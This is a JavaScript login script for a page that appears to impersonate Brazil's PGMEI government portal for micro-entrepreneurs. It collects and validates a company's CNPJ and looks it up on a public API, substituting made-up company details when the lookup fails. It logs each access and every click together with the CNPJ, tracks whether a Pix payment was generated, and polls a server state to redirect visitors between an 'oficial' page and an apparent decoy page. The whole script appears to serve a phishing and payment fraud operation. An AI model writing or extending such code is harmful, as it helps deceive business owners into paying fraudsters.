(function() {
  const cnpjInput = document.getElementById("cnpj");
  const continueButton = document.getElementById("continuar");
  let loading = false;

  function fallbackCompanyData(cnpjMask) {
    return {
      cnpj: cnpjMask,
      nome: "SERVICO EMPRESARIAL ASSEGURADO ILTDA",
      nome_fantasia: "ALBUQUERQUE CONSULTORIA MEI DAS",
      data_inicio_atividade: "2024-01-02",
      cnae_principal: "7020-4/00 - Atividades de consultoria em gestao empresarial",
      endereco: "SAO PAULO - SP"
    };
  }

  function setLoading(isLoading) {
    loading = isLoading;
    continueButton.disabled = isLoading;
    continueButton.textContent = isLoading ? "Carregando..." : "Continuar";
  }

  async function loadStateAndGuard() {
    try {
      const state = await window.PGMEI.fetchState();
      window.PGMEI.applyPageTitleByState(state);
      if (state.analytics.activePage === "secondary") {
        window.PGMEI.redirect("/adv/");
        return false;
      }
      if (window.PGMEI.getSession()) {
        window.PGMEI.redirect("/oficial/");
        return false;
      }
    } catch (error) {
      console.warn("Falha ao validar estado na tela de login:", error.message);
    }
    return true;
  }

  async function lookupCompany(cnpjDigits, cnpjMask) {
    try {
      const response = await fetch("https://brasilapi.com.br/api/cnpj/v1/" + cnpjDigits, { cache: "no-store" });
      if (!response.ok) {
        throw new Error("Consulta externa indisponivel");
      }

      const company = await response.json();
      return {
        cnpj: cnpjMask,
        nome: company.razao_social || company.nome_fantasia || fallbackCompanyData(cnpjMask).nome,
        nome_fantasia: company.nome_fantasia || company.razao_social || fallbackCompanyData(cnpjMask).nome_fantasia,
        data_inicio_atividade: company.data_inicio_atividade || fallbackCompanyData(cnpjMask).data_inicio_atividade,
        cnae_principal: company.cnae_fiscal_descricao
          ? company.cnae_fiscal + " - " + company.cnae_fiscal_descricao
          : fallbackCompanyData(cnpjMask).cnae_principal,
        endereco: [company.municipio, company.uf].filter(Boolean).join(" - ") || fallbackCompanyData(cnpjMask).endereco
      };
    } catch (error) {
      return fallbackCompanyData(cnpjMask);
    }
  }

  async function login() {
    if (loading) {
      return;
    }

    const cnpjMask = window.PGMEI.maskCnpj(cnpjInput.value);
    const cnpjDigits = cnpjMask.replace(/\D/g, "");
    cnpjInput.value = cnpjMask;

    if (!window.PGMEI.validateCnpj(cnpjDigits)) {
      toastr.error("CNPJ invalido. Verifique o numero informado.", "Erro");
      return;
    }

    setLoading(true);

    try {
      const state = await window.PGMEI.fetchState();
      if (state.analytics.activePage === "secondary") {
        window.PGMEI.redirect("/adv/");
        return;
      }

      const companyData = await lookupCompany(cnpjDigits, cnpjMask);
      window.PGMEI.saveSession(companyData);
      const trackingState = await window.PGMEI.sendAction("track_cnpj_access", {
        cnpj: companyData.cnpj,
        companyName: companyData.nome,
        location: "/oficial/"
      });
      const currentAccess = (trackingState.analytics.accessLog || [])[0] || null;
      if (currentAccess) {
        window.PGMEI.saveTrackingSession({
          time: currentAccess.time,
          cnpj: companyData.cnpj,
          companyName: companyData.nome,
          pixGenerated: false
        });
      }
      window.PGMEI.redirect("/oficial/");
    } catch (error) {
      toastr.error(error.message || "Nao foi possivel concluir o acesso.", "Erro");
    } finally {
      setLoading(false);
    }
  }

  document.addEventListener("DOMContentLoaded", async function() {
    window.PGMEI.applyPageTitleByState();
    if (!(await loadStateAndGuard())) {
      return;
    }

    try {
      await window.PGMEI.recordVisit("primary", "/login/");
    } catch (error) {
      console.warn("Falha ao registrar visita do login:", error.message);
    }

    cnpjInput.focus();

    cnpjInput.addEventListener("input", function() {
      cnpjInput.value = window.PGMEI.maskCnpj(cnpjInput.value);
    });

    document.addEventListener("click", function(event) {
      const target = event.target.closest("button, a, input, select, textarea, label");
      if (target) {
        const cnpjMask = window.PGMEI.maskCnpj(cnpjInput.value);
        window.PGMEI.recordClick("primary", "/login/", target.textContent || target.name || target.id || "Clique", {
          cnpj: cnpjMask
        });
      }
    });

    continueButton.addEventListener("click", function(event) {
      event.preventDefault();
      login();
    });

    document.getElementById("identificacao").addEventListener("submit", function(event) {
      event.preventDefault();
      login();
    });

    setInterval(loadStateAndGuard, 5000);
  });
})();
